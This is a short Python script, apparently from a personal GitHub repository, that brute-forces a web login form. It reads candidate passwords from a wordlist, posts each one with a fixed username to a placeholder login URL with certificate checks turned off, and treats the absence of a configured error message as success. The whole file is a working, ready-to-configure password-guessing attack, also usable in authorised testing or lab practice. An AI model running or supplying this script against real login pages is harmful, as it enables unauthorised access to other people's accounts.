#!/usr/bin/python3
######################################################################################################
# Title: Brute force Attack with python
# Author: Marcos Llorens
# Github : https://github.com/ll0rens
# If you use the code give me the credit please
######################################################################################################

from pwn import *
import requests, pdb, signal, sys, time, re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def def_handler(sig, frame):
    print("\n\n[!] Exit... \n")
    sys.exit(1)

# ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Global variables
main_url = "URL of the login page"
error_message = "Enter Wrong Password Error Message"
username = "Enter the username to try"

def bruteForce():

    f = open("passwords.txt", "r")

    p1 = log.progress("Brute force attack...")
    p1.status("Starting the attack...")

    time.sleep(2)

    counter = 1

    for password in f.readlines():
        #Remove the \n from the potential password
        password = password.strip('\n')

        p1.status("Probrando la contraseña [%d/349] : %s" % (counter, password))

        # Choose your post data in the global variables
        post_data = {
            'username': username,
            'password': '%s' % password
        }

        # Choose your headers
        headers = {
        }

        r = requests.post(main_url, data=post_data, headers=headers,verify=False)
        counter += 1

        #Choose the error message in the global variables
        if error_message not in r.text:
            p1.success("The password is -> %s" % password)
            break


if __name__ == '__main__':

    bruteForce()
